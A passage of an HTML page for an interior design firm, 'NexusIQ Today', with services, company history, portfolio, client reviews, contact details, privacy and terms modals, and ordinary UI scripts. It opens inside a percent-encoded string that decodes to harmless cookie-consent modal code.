20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20%53%68%6F%77%20%63%6F%6E%73%65%6E%74%20%6D%6F%64%61%6C%20%6F%6E%20%70%61%67%65%20%6C%6F%61%64%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6C%6F%61%64%27%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%53%6D%61%6C%6C%20%64%65%6C%61%79%20%66%6F%72%20%62%65%74%74%65%72%20%55%58%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%68%6F%77%43%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%35%30%30%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20%48%61%6E%64%6C%65%20%45%53%43%20%6B%65%79%20%74%6F%20%63%6C%6F%73%65%20%6D%6F%64%61%6C%20%28%6F%70%74%69%6F%6E%61%6C%29%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6B%65%79%64%6F%77%6E%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%2E%6B%65%79%20%3D%3D%3D%20%27%45%73%63%61%70%65%27%20%26%26%20%21%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%4F%76%65%72%6C%61%79%27%29%2E%63%6C%61%73%73%4C%69%73%74%2E%63%6F%6E%74%61%69%6E%73%28%27%68%69%64%64%65%6E%27%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%4F%70%74%69%6F%6E%61%6C%6C%79%20%61%6C%6C%6F%77%20%45%53%43%20%74%6F%20%63%6C%6F%73%65%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%68%69%64%65%43%6F%6F%6B%69%65%43%6F%6E%73%65%6E%74%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E'));
</script>

    <header class="header-nav-x7k9">
        <nav class="nav-container-m4p2">
            <a href="#home" class="logo-brand-q8w5">NexusIQ Today</a>
            <ul class="nav-menu-r3t7">
                <li><a href="#home">Home</a></li>
                <li><a href="#services">Services</a></li>
                <li><a href="#about">About</a></li>
                <li><a href="#history">History</a></li>
                <li><a href="#portfolio">Portfolio</a></li>
                <li><a href="#expertise">Expertise</a></li>
                <li><a href="#reviews">Reviews</a></li>
                <li><a href="#contact">Contact</a></li>
                <li><a href="#" onclick="openModal('privacy')">Privacy</a></li>
                <li><a href="#" onclick="openModal('terms')">Terms</a></li>
            </ul>
        </nav>
    </header>

    <section id="home" class="hero-section-b9n1">
        <div class="hero-content-d5j8">
            <h1 class="hero-title-k2l6">Transform Your Space</h1>
            <p class="hero-subtitle-v7x3">Creating beautiful, functional interiors that reflect your unique style and enhance your daily life</p>
            <a href="#services" class="cta-button-z4h9">Explore Our Services</a>
        </div>
    </section>

    <section id="services" style="padding: 4rem 0;">
        <h2 class="section-title-b4v8">Our Services</h2>
        <div class="services-grid-f8p4">
            <div class="service-card-n6m2">
                <div class="service-icon-w1q5">🏠</div>
                <h3>Residential Design</h3>
                <p>Complete home makeovers that blend comfort with style. We work closely with homeowners to create spaces that truly feel like home while maximizing functionality and aesthetic appeal.</p>
            </div>
            <div class="service-card-n6m2">
                <div class="service-icon-w1q5">🏢</div>
                <h3>Commercial Spaces</h3>
                <p>Professional office and retail environments designed to enhance productivity and customer experience. Our commercial designs focus on brand identity and operational efficiency.</p>
            </div>
            <div class="service-card-n6m2">
                <div class="service-icon-w1q5">🎨</div>
                <h3>Color Consultation</h3>
                <p>Expert color schemes that transform the mood and energy of any space. We help you choose the perfect palette that complements your lifestyle and architectural features.</p>
            </div>
            <div class="service-card-n6m2">
                <div class="service-icon-w1q5">🪑</div>
                <h3>Furniture Selection</h3>
                <p>Curated furniture pieces that combine form and function. We source quality pieces that fit your budget while creating cohesive and inviting living spaces.</p>
            </div>
            <div class="service-card-n6m2">
                <div class="service-icon-w1q5">💡</div>
                <h3>Lighting Design</h3>
                <p>Strategic lighting solutions that enhance ambiance and functionality. From natural light optimization to custom fixture selection, we illuminate your space perfectly.</p>
            </div>
            <div class="service-card-n6m2">
                <div class="service-icon-w1q5">📐</div>
                <h3>Space Planning</h3>
                <p>Efficient layout solutions that maximize your available space. We create floor plans that improve traffic flow and make every square foot count.</p>
            </div>
        </div>
    </section>

    <section id="about" class="about-section-y3r8">
        <div class="about-container-u9i7">
            <div class="about-text-s5e2">
                <h2>About NexusIQ Today</h2>
                <p>Founded with a passion for creating exceptional interior spaces, NexusIQ Today has been transforming homes and businesses for over a decade. Our team of skilled designers brings together creativity, functionality, and innovation to deliver personalized solutions that exceed expectations.</p>
                <p>We believe that great design should be accessible to everyone. Our approach combines careful listening with expert knowledge to create spaces that not only look beautiful but also work perfectly for how you live and work.</p>
                <p>From initial consultation to final installation, we guide you through every step of the design process, ensuring that your vision becomes reality while staying within your timeline and budget.</p>
            </div>
            <div class="about-image-t6y4">
                <img src="https://images.pexels.com/photos/1571463/pexels-photo-1571463.jpeg" alt="Interior Design Team at Work">
            </div>
        </div>
    </section>

    <section id="history" style="padding: 4rem 0;">
        <h2 class="section-title-b4v8">Our Journey</h2>
        <div class="history-timeline-a7c3">
            <div class="timeline-item-h4k8">
                <div class="timeline-year-p2l9">2012</div>
                <div>
                    <h3>The Beginning</h3>
                    <p>NexusIQ Today was founded by Sarah Mitchell and David Chen, two passionate designers who met while working on a community center renovation project. They shared a vision of making quality interior design accessible to a broader audience.</p>
                </div>
            </div>
            <div class="timeline-item-h4k8">
                <div class="timeline-year-p2l9">2015</div>
                <div>
                    <h3>First Major Project</h3>
                    <p>Completed our first large-scale commercial project - a 50,000 square foot corporate headquarters. This project established our reputation for handling complex, multi-phase design challenges while maintaining attention to detail.</p>
                </div>
            </div>
            <div class="timeline-item-h4k8">
                <div class="timeline-year-p2l9">2018</div>
                <div>
                    <h3>Team Expansion</h3>
                    <p>Grew our team to include specialists in sustainable design, lighting consultation, and project management. This expansion allowed us to offer more comprehensive services and take on larger, more complex projects.</p>
                </div>
            </div>
            <div class="timeline-item-h4k8">
                <div class="timeline-year-p2l9">2021</div>
                <div>
                    <h3>Digital Innovation</h3>
                    <p>Launched our virtual design consultation service and 3D visualization platform, making our services accessible to clients nationwide. This technology allows clients to see their space transformed before any work begins.</p>
                </div>
            </div>
            <div class="timeline-item-h4k8">
                <div class="timeline-year-p2l9">2024</div>
                <div>
                    <h3>Sustainable Focus</h3>
                    <p>Achieved certification as a green design firm, specializing in eco-friendly materials and energy-efficient solutions. We now help clients create beautiful spaces that are also environmentally responsible.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="expertise" style="padding: 4rem 0; background: #f8f9fa;">
        <h2 class="section-title-b4v8">Areas of Expertise</h2>
        <div class="expertise-cards-v2n7">
            <div class="expertise-card-f3q9">
                <h3>Kitchen Renovations</h3>
                <p>Transforming the heart of your home with functional layouts, quality materials, and timeless design elements that enhance both cooking and entertaining experiences.</p>
            </div>
            <div class="expertise-card-f3q9">
                <h3>Bathroom Design</h3>
                <p>Creating spa-like retreats that combine relaxation with practicality. From powder rooms to master suites, we design bathrooms that are both beautiful and functional.</p>
            </div>
            <div class="expertise-card-f3q9">
                <h3>Living Spaces</h3>
                <p>Designing comfortable and stylish living rooms, family rooms, and entertainment areas that bring people together while reflecting your personal style.</p>
            </div>
            <div class="expertise-card-f3q9">
                <h3>Home Offices</h3>
                <p>Productive workspace design that enhances focus and creativity. We create home offices that are professional, comfortable, and perfectly suited to your work style.</p>
            </div>
            <div class="expertise-card-f3q9">
                <h3>Retail Environments</h3>
                <p>Commercial spaces that enhance customer experience and drive sales. Our retail designs create inviting atmospheres that encourage browsing and purchasing.</p>
            </div>
            <div class="expertise-card-f3q9">
                <h3>Hospitality Design</h3>
                <p>Restaurant and hotel interiors that create memorable experiences for guests. We design spaces that reflect brand identity while ensuring comfort and functionality.</p>
            </div>
        </div>
    </section>

    <section id="portfolio" class="portfolio-showcase-g4h5">
        <h2 class="section-title-b4v8">Recent Projects</h2>
        <div class="portfolio-grid-r6t3">
            <div class="portfolio-item-e9w8">
                <img src="https://images.pexels.com/photos/1571468/pexels-photo-1571468.jpeg" alt="Modern Living Room Design">
                <div class="portfolio-overlay-z2x7">
                    <h3>Contemporary Living Room</h3>
                </div>
            </div>
            <div class="portfolio-item-e9w8">
                <img src="https://images.pexels.com/photos/2029667/pexels-photo-2029667.jpeg" alt="Kitchen Renovation Project">
                <div class="portfolio-overlay-z2x7">
                    <h3>Kitchen Transformation</h3>
                </div>
            </div>
            <div class="portfolio-item-e9w8">
                <img src="https://images.pexels.com/photos/1571470/pexels-photo-1571470.jpeg" alt="Office Space Design">
                <div class="portfolio-overlay-z2x7">
                    <h3>Corporate Office</h3>
                </div>
            </div>
            <div class="portfolio-item-e9w8">
                <img src="https://images.pexels.com/photos/1571471/pexels-photo-1571471.jpeg" alt="Bedroom Interior Design">
                <div class="portfolio-overlay-z2x7">
                    <h3>Master Bedroom Suite</h3>
                </div>
            </div>
            <div class="portfolio-item-e9w8">
                <img src="https://images.pexels.com/photos/2029694/pexels-photo-2029694.jpeg" alt="Bathroom Renovation">
                <div class="portfolio-overlay-z2x7">
                    <h3>Spa-Inspired Bathroom</h3>
                </div>
            </div>
            <div class="portfolio-item-e9w8">
                <img src="https://images.pexels.com/photos/1571472/pexels-photo-1571472.jpeg" alt="Dining Room Design">
                <div class="portfolio-overlay-z2x7">
                    <h3>Elegant Dining Space</h3>
                </div>
            </div>
        </div>
    </section>

    <section id="reviews" class="reviews-section-x8v6">
        <div class="reviews-container-j9n4">
            <h2 class="section-title-b4v8" style="color: white;">Client Reviews</h2>
            <div class="reviews-grid-c5b7">
                <div class="review-card-m3q1">
                    <p>"The team at NexusIQ Today completely transformed our outdated kitchen into a modern, functional space that we absolutely love. Their attention to detail and creative solutions exceeded our expectations."</p>
                    <div class="reviewer-info-l8d6">
                        <div class="reviewer-avatar-k7f2">MJ</div>
                        <div>
                            <strong>Maria Johnson</strong><br>
                            <small>Homeowner, Seattle</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-m3q1">
                    <p>"Working with NexusIQ Today on our office renovation was seamless. They understood our company culture and created a workspace that both employees and clients love. Highly recommended!"</p>
                    <div class="reviewer-info-l8d6">
                        <div class="reviewer-avatar-k7f2">RT</div>
                        <div>
                            <strong>Robert Thompson</strong><br>
                            <small>CEO, Tech Startup</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-m3q1">
                    <p>"From initial consultation to final walkthrough, the process was professional and stress-free. Our living room makeover has become the favorite gathering spot for family and friends."</p>
                    <div class="reviewer-info-l8d6">
                        <div class="reviewer-avatar-k7f2">LC</div>
                        <div>
                            <strong>Lisa Chen</strong><br>
                            <small>Homeowner, Portland</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-m3q1">
                    <p>"The sustainable design approach was exactly what we were looking for. Beautiful results with environmentally conscious materials and energy-efficient solutions throughout our home."</p>
                    <div class="reviewer-info-l8d6">
                        <div class="reviewer-avatar-k7f2">DW</div>
                        <div>
                            <strong>David Wilson</strong><br>
                            <small>Homeowner, San Francisco</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-m3q1">
                    <p>"Our restaurant's new interior has received countless compliments from customers. The design perfectly captures our brand while creating a welcoming atmosphere that keeps people coming back."</p>
                    <div class="reviewer-info-l8d6">
                        <div class="reviewer-avatar-k7f2">AM</div>
                        <div>
                            <strong>Anna Martinez</strong><br>
                            <small>Restaurant Owner</small>
                        </div>
                    </div>
                </div>
                <div class="review-card-m3q1">
                    <p>"The virtual consultation service was incredibly convenient. We could see exactly how our space would look before making any commitments. The final result was even better than we imagined."</p>
                    <div class="reviewer-info-l8d6">
                        <div class="reviewer-avatar-k7f2">JB</div>
                        <div>
                            <strong>James Brown</strong><br>
                            <small>Homeowner, Denver</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <footer id="contact" class="footer-main-q1w9">
        <div class="footer-content-a8s4">
            <div class="footer-section-d7f5">
                <h3>Contact Information</h3>
                <div class="contact-info-n5j3">
                    <p>📍 2847 Innovation Drive, Suite 320<br>Austin, TX 78704</p>
                    <p>📧 <a href="mailto:hello@nexusiqtoday.com">hello@nexusiqtoday.com</a></p>
                    <p>📱 <a href="tel:+15127849632">(512) 784-9632</a></p>
                    <p>🕒 Mon-Fri: 9:00 AM - 6:00 PM<br>Sat: 10:00 AM - 4:00 PM</p>
                </div>
            </div>
            <div class="footer-section-d7f5">
                <h3>Our Services</h3>
                <ul style="list-style: none;">
                    <li>• Residential Interior Design</li>
                    <li>• Commercial Space Planning</li>
                    <li>• Color & Material Consultation</li>
                    <li>• Furniture Selection & Procurement</li>
                    <li>• Lighting Design Solutions</li>
                    <li>• Sustainable Design Options</li>
                </ul>
            </div>
            <div class="footer-section-d7f5">
                <h3>Service Areas</h3>
                <p>We proudly serve clients throughout Texas and offer virtual consultations nationwide. Our primary service areas include:</p>
                <ul style="list-style: none; margin-top: 1rem;">
                    <li>• Austin & Central Texas</li>
                    <li>• Houston Metropolitan Area</li>
                    <li>• Dallas-Fort Worth Region</li>
                    <li>• San Antonio & South Texas</li>
                </ul>
            </div>
            <div class="footer-section-d7f5">
                <h3>Get Started</h3>
                <p>Ready to transform your space? Contact us today for a free initial consultation. We'll discuss your vision, timeline, and budget to create a customized design plan that brings your dreams to life.</p>
                <p style="margin-top: 1rem;"><strong>Free Consultation Available</strong></p>
            </div>
        </div>
        <div style="text-align: center; padding-top: 2rem; border-top: 1px solid #34495e; margin-top: 2rem;">
            <p>© 2024 NexusIQ Today. All rights reserved. | <a href="#" onclick="openModal('privacy')" style="color: #3498db;">Privacy Policy</a> | <a href="#" onclick="openModal('terms')" style="color: #3498db;">Terms of Service</a></p>
        </div>
    </footer>

    <!-- Privacy Policy Modal -->
    <div id="privacyModal" class="modal-overlay-x9k2">
        <div class="modal-content-p7l4">
            <span class="modal-close-h6m8" onclick="closeModal('privacy')">×</span>
            <h2>Privacy Policy</h2>
            <p><strong>Last updated: January 2024</strong></p>
            
            <h3>Information We Collect</h3>
<p>NexusIQ Today collects information you provide directly to us, such as when you create an account, request a consultation, or contact us. This may include your name, email address, phone number, address, and project details.</p>
        <h3>How We Use Your Information</h3>
        <p>We use the information we collect to provide, maintain, and improve our services, communicate with you about your projects, send you updates about our services, and comply with legal obligations.</p>
        
        <h3>Information Sharing</h3>
        <p>We do not sell, trade, or otherwise transfer your personal information to third parties without your consent, except as described in this policy or as required by law.</p>
        
        <h3>Data Security</h3>
        <p>We implement appropriate security measures to protect your personal information against unauthorized access, alteration, disclosure, or destruction.</p>
        
        <h3>Contact Us</h3>
        <p>If you have questions about this Privacy Policy, please contact us at hello@nexusiqtoday.com or (512) 784-9632.</p>
    </div>
</div>

<!-- Terms of Service Modal -->
<div id="termsModal" class="modal-overlay-x9k2">
    <div class="modal-content-p7l4">
        <span class="modal-close-h6m8" onclick="closeModal('terms')">×</span>
        <h2>Terms of Service</h2>
        <p><strong>Last updated: January 2024</strong></p>
        
        <h3>Acceptance of Terms</h3>
        <p>By accessing and using NexusIQ Today's services, you accept and agree to be bound by the terms and provision of this agreement.</p>
        
        <h3>Services Description</h3>
        <p>NexusIQ Today provides interior design consultation, space planning, and related design services. All services are subject to availability and our professional standards.</p>
        
        <h3>Client Responsibilities</h3>
        <p>Clients are responsible for providing accurate information, timely feedback, and payment according to agreed terms. Clients must also ensure access to project sites as needed.</p>
        
        <h3>Payment Terms</h3>
        <p>Payment terms will be specified in individual project agreements. Late payments may result in project delays or suspension of services.</p>
        
        <h3>Intellectual Property</h3>
        <p>All design concepts, plans, and materials created by NexusIQ Today remain our intellectual property until full payment is received.</p>
        
        <h3>Limitation of Liability</h3>
        <p>NexusIQ Today's liability is limited to the amount paid for services. We are not responsible for delays or issues caused by third-party contractors or suppliers.</p>
        
        <h3>Modification of Terms</h3>
        <p>We reserve the right to modify these terms at any time. Continued use of our services constitutes acceptance of modified terms.</p>
        
        <h3>Contact Information</h3>
        <p>For questions regarding these terms, contact us at hello@nexusiqtoday.com or (512) 784-9632.</p>
    </div>
</div>

<script>
    // Smooth scrolling for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });

    // Modal functions
    function openModal(type) {
        const modal = document.getElementById(type + 'Modal');
        if (modal) {
            modal.style.display = 'block';
            document.body.style.overflow = 'hidden';
        }
    }

    function closeModal(type) {
        const modal = document.getElementById(type + 'Modal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    // Close modal when clicking outside
    window.addEventListener('click', function(e) {
        if (e.target.classList.contains('modal-overlay-x9k2')) {
            e.target.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    });

    // Header background change on scroll
    window.addEventListener('scroll', function() {
        const header = document.querySelector('.header-nav-x7k9');
        if (window.scrollY > 100) {
            header.style.background = 'rgba(44, 62, 80, 0.95)';
            header.style.backdropFilter = 'blur(10px)';
        } else {
            header.style.background = 'linear-gradient(135deg, #2c3e50, #34495e)';
            header.style.backdropFilter = 'none';
        }
    });

    // Animate elements on scroll
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    // Observe service cards and other elements
    document.addEventListener('DOMContentLoaded', function() {
        const animatedElements = document.querySelectorAll('.service-card-n6m2, .review-card-m3q1, .expertise-card-f3q9, .timeline-item-h4k8');
        
        animatedElements.forEach(el => {
            el.style.opacity = '0';
            el.style.transform = 'translateY(30px)';
            el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
            observer.observe(el);
        });
    });

    // Mobile menu toggle (for smaller screens)
    function toggleMobileMenu() {
        const navMenu = document.querySelector('.nav-menu-r3t7');
        navMenu.classList.toggle('mobile-active');
    }

    // Add mobile menu styles
    const mobileStyles = `
        @media (max-width: 768px) {
            .nav-menu-r3t7 {
                position: absolute;
                top: 100%;
                left: 0;
                width: 100%;
                background: #2c3e50;
                flex-direction: column;
                padding: 1rem;
                display: none;
            }
            
            .nav-menu-r3t7.mobile-active {
                display: flex;
            }
            
            .mobile-menu-toggle {
                display: block;
                background: none;
                border: none;
                color: white;
                font-size: 1.5rem;
                cursor: pointer;
            }
        }
        
        @media (min-width: 769px) {
            .mobile-menu-toggle {
                display: none;
            }
        }
    `;

    // Add mobile styles to head
    const styleSheet = document.createElement('style');
    styleSheet.textContent = mobileStyles;
    document.head.appendChild(styleSheet);

    // Add mobile menu button
    const navContainer = document.querySelector('.nav-container-m4p2');
    const mobileMenuBtn = document.createElement('button');
    mobileMenuBtn.className = 'mobile-menu-toggle';
    mobileMenuBtn.innerHTML = '☰';
    mobileMenuBtn.onclick = toggleMobileMenu;
    navContainer.appendChild(mobileMenuBtn);

    // Form validation and interaction enhancements
    document.addEventListener('DOMContentLoaded', function() {
        // Add hover effects to portfolio items
        const portfolioItems = document.querySelectorAll('.portfolio-item-e9w8');
        portfolioItems.forEach(item => {
            item.addEventListener('mouseenter', function() {
                this.style.transform = 'scale(1.02)';
            });
            
            item.addEventListener('mouseleave', function() {
                this.style.transform = 'scale(1)';
            });
        });

        // Add click tracking for analytics (placeholder)
        const ctaButtons = document.querySelectorAll('.cta-button-z4h9');
        ctaButtons.forEach(button => {
            button.addEventListener('click', function() {
                // Analytics tracking would go here
                console.log('CTA button clicked:', this.textContent);
            });
        });

        // Lazy loading for images
        const images = document.querySelectorAll('img');
        const imageObserver = new IntersectionObserver((entries, observer) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const img = entry.target;
                    img.style.opacity = '1';
                    observer.unobserve(img);
                }
            });
        });

        images.forEach(img => {
            img.style.opacity = '0';
            img.style.transition = 'opacity 0.3s';
            img.addEventListener('load', () => {
                img.style.opacity = '1';
            });
            imageObserver.observe(img);
        });
    });

    // Add scroll-to-top functionality
    window.addEventListener('scroll', function() {
        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
        
        if (scrollTop > 500) {
            if (!document.querySelector('.scroll-to-top-btn')) {
                const scrollBtn = document.createElement('button');
                scrollBtn.className = 'scroll-to-top-btn';
                scrollBtn.innerHTML = '↑';
                scrollBtn.style.cssText = `
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    background: #e74c3c;
                    color: white;
                    border: none;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    font-size: 1.2rem;
                    cursor: pointer;
                    z-index: 1000;
                    transition: all 0.3s ease;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                `;
                
                scrollBtn.addEventListener('click', function() {
                    window.scrollTo({
                        top: 0,
                        behavior: 'smooth'
                    });
                });
                
                scrollBtn.addEventListener('mouseenter', function() {
                    this.style.background = '#c0392b';
                    this.style.transform = 'scale(1.1)';
                });
                
                scrollBtn.addEventListener('mouseleave', function() {
                    this.style.background = '#e74c3c';
                    this.style.transform = 'scale(1)';
                });
                
                document.body.appendChild(scrollBtn);
            }
        } else {
            const existingBtn = document.querySelector('.scroll-to-top-btn');
            if (existingBtn) {
                existingBtn.remove();
            }
        }
    });
</script>

<a href="/" alt="stats counter free" target="_blank" >
<img  src="https://sstatic1.histats.com/0.gif?4977134&101" alt="stats counter free" border="0">
    
</body> 
</html>



